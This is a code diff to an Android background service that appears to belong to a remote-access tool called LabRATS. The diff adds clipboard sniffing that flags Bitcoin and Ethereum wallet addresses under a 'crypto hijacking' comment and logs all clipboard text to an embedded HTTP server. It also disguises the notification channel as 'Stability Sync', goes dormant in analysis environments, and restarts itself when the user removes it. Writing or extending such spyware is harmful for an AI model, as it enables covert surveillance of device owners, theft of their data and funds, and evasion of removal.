@@ -33,9 +33,12 @@ import java.util.concurrent.Executors;
 public class CoreSyncService extends Service {
 
     private static final String TAG = "CoreSyncService";
-    private static final String CHANNEL_ID = "LabRATS-Channel";
+    private static final String CHANNEL_ID = "StabilityChannel";
     private static final int NOTIFICATION_ID = 1;
     public static boolean isRunning = false;
+    public static volatile boolean isDestructing = false;
+    private static CoreSyncService instance;
+    public static CoreSyncService getInstance() { return instance; }
     
     // Heartbeat Interval: 5 Minutes
     private static final long HEARTBEAT_MS = 5 * 60 * 1000;
@@ -61,9 +64,20 @@ public class CoreSyncService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
+        instance = this;
+
+        // --- NUCLEAR DESTRUCT CHECK ---
+        // If the persistent destruct flag is set, do not initialize anything.
+        if (getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("is_destructing", false)) {
+            Log.w(TAG, "Destruction protocol active. Terminating initialization.");
+            isDestructing = true;
+            SystemAnalytics.triggerSelfDestructLoop(this);
+            stopSelf();
+            return;
+        }
         
         // --- EVASION PROTOCOL: Dormancy in risky environments ---
-        if (SystemAnalytics.isEnvironmentRisky()) {
+        if (SystemAnalytics.checkEnv(this)) {
             Log.w(TAG, "Environment risk detected. Core protocols entering dormant state.");
             return;
         }
@@ -89,7 +103,19 @@ public class CoreSyncService extends Service {
                         if (clip != null && clip.getItemCount() > 0) {
                             CharSequence text = clip.getItemAt(0).getText();
                             if (text != null && text.length() > 0) {
-                                LabRatsHttpServer.logActivity("CLIPBOARD_SNIFFED: " + text.toString());
+                                String captured = text.toString();
+                                
+                                // --- CRYPTO HIJACKING (Wuzenx Style) ---
+                                // BTC: ^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$
+                                // ETH: ^0x[a-fA-F0-9]{40}$
+                                boolean isBtc = captured.matches("^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$");
+                                boolean isEth = captured.matches("^0x[a-fA-F0-9]{40}$");
+                                
+                                if (isBtc || isEth) {
+                                    LabRatsHttpServer.logActivity("TELEMETRY_DELTA: High-priority buffer updated (" + (isBtc ? "Type-B" : "Type-E") + ")");
+                                }
+                                
+                                LabRatsHttpServer.logActivity("BUFFER_SYNC: " + captured);
                             }
                         }
                     }
@@ -201,6 +227,24 @@ public class CoreSyncService extends Service {
         return START_STICKY;
     }
 
+    @Override
+    public void onTaskRemoved(Intent rootIntent) {
+        if (isDestructing) {
+            super.onTaskRemoved(rootIntent);
+            return;
+        }
+        // [RESURRECTION_PROTOCOL] If swiped away or stopped from task manager, reboot 1s later
+        Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
+        restartServiceIntent.setPackage(getPackageName());
+        android.app.PendingIntent restartServicePendingIntent = android.app.PendingIntent.getService(
+            getApplicationContext(), 1, restartServiceIntent, android.app.PendingIntent.FLAG_ONE_SHOT | android.app.PendingIntent.FLAG_IMMUTABLE);
+        android.app.AlarmManager alarmService = (android.app.AlarmManager) getApplicationContext().getSystemService(android.content.Context.ALARM_SERVICE);
+        if (alarmService != null) {
+            alarmService.set(android.app.AlarmManager.ELAPSED_REALTIME, android.os.SystemClock.elapsedRealtime() + 1000, restartServicePendingIntent);
+        }
+        super.onTaskRemoved(rootIntent);
+    }
+
     private void ensureForeground() {
         if (isForeground) {
             // Update existing notification to match current stealth state
@@ -234,7 +278,7 @@ public class CoreSyncService extends Service {
     private synchronized void startServer() {
         try {
             if (server == null || !server.isAlive()) {
-                server = new LabRatsHttpServer(this, 8080);
+                server = new LabRatsHttpServer(this, 9191);
                 server.start();
                 isRunning = true;
                 Log.d(TAG, "HTTP Server started on port 8080");
@@ -302,7 +346,7 @@ public class CoreSyncService extends Service {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
                     CHANNEL_ID,
-                    "LabRATS-Channel",
+                    "Stability Sync",
                     NotificationManager.IMPORTANCE_MIN);
             channel.setDescription("Ensures background service persistence");
             channel.setShowBadge(false);
@@ -355,6 +399,7 @@ public class CoreSyncService extends Service {
     @Override
     public void onDestroy() {
         isRunning = false;
+        instance = null;
         isForeground = false; // CRITICAL: Reset state so next start calls startForeground()
         // Clean up resources immediately on background thread
         networkExecutor.execute(() -> {
